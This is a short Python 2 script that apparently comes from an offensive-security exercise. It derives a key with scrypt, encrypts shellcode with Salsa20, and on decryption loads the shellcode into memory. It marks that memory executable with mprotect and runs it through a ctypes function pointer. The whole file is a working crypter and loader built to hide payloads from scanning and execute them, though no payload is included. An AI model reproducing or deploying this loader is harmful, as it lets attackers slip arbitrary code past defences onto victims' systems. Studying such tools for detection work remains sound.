#!/usr/bin/env python2

from Crypto.Cipher import Salsa20
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
import sys
import binascii
import pyscrypt

def encrypt(text, secret):
        ciphertext = Salsa20.new(key=secret)
        msg= ciphertext.nonce + ciphertext.encrypt(text)
	print binascii.hexlify(msg)

def decrypt(text, secret):
    
	msg_nonce = text[:8]
	ciphertext = text[8:]
	cipher = Salsa20.new(key=secret, nonce=msg_nonce)
	plaintext = cipher.decrypt(ciphertext)
	print "Your decrypted shellcode is %s" %plaintext
        print "Launching shellcode..."
        execute(plaintext)
	
def execute(plaintext):

	libc = CDLL('libc.so.6')
        shellcode = plaintext.replace('\\x', '').decode('hex')
	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))
	run()

action = sys.argv[3]
key = pyscrypt.hash(sys.argv[1], "vinegrep", 1024, 1, 1, 32)

if action == "encrypt":
    text = sys.argv[2]
    encrypt(text, key)
elif action == "decrypt":
    text = binascii.unhexlify(sys.argv[2])
    decrypt(text, key)
else:
    print("Allowed actions: encrypt, decrypt")
